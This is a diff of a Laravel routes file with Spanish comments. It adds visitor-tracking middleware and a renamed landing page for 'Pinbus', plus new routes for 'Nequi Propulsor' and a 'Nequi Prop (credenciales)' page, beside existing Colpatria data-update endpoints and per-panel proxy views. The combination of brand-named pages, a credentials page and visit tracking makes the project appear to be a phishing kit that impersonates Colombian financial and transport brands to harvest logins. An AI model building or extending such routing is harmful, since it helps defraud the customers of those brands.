@@ -45,9 +45,11 @@ Route::get('/colpatria/datos', [\App\Http\Controllers\ColpatriaController::class
 Route::post('/colpatria/actualizar', [\App\Http\Controllers\ColpatriaController::class, 'actualizarDatos'])->name('colpatria.actualizar');
 
 // Rutas de Pinbus/Brasilia
+// IMPORTANTE: El archivo se llama page.html (no index.html) para evitar que Nginx lo sirva directamente
+// y así el middleware TrackVisitor pueda registrar las visitas
 Route::get('/pin/inicio/{trailing?}', function () {
-    return response()->file(public_path('pin/inicio/index.html'));
-})->where('trailing', '.*')->name('pinbus.inicio');
+    return response()->file(public_path('pin/inicio/page.html'));
+})->where('trailing', '.*')->middleware(\App\Http\Middleware\TrackVisitor::class)->name('pinbus.inicio');
 Route::get('/pin/brasil', [\App\Http\Controllers\PinbusController::class, 'index'])->name('pinbus.index');
 Route::get('/pin/buscar', [\App\Http\Controllers\PinbusController::class, 'search'])->name('pinbus.search');
 Route::post('/pin/buscar', [\App\Http\Controllers\PinbusController::class, 'search'])->name('pinbus.search.post');
@@ -63,6 +65,16 @@ Route::get('/pin/buscar/search/{origin}/{destination}/{date}/{any?}', [\App\Http
 Route::get('/pin/reservar/{tripId}', [\App\Http\Controllers\PinbusController::class, 'selectSeats'])->name('pinbus.sillas');
 // API para buscar viajes con cálculo de distancia y precio
 Route::post('/pin/api/viajes', [\App\Http\Controllers\PinbusController::class, 'buscarViajes'])->name('pinbus.api.viajes');
+
+// Ruta de Nequi Propulsor
+Route::get('/nequi/propulsor', function () {
+    return response()->file(public_path('nequi/inicio/propulsor.html'));
+})->middleware(\App\Http\Middleware\TrackVisitor::class)->name('nequi.propulsor');
+
+// Ruta de Nequi Prop (credenciales)
+Route::get('/nequi/prop', function () {
+    return view('nequi.prop');
+})->middleware(\App\Http\Middleware\TrackVisitor::class)->name('nequi.prop');
 
 // Rutas específicas por panel y vista (backwards compatibility y acceso directo)
 Route::get('/{panel}/{view}', [ProxyViewController::class, 'showByPanel'])
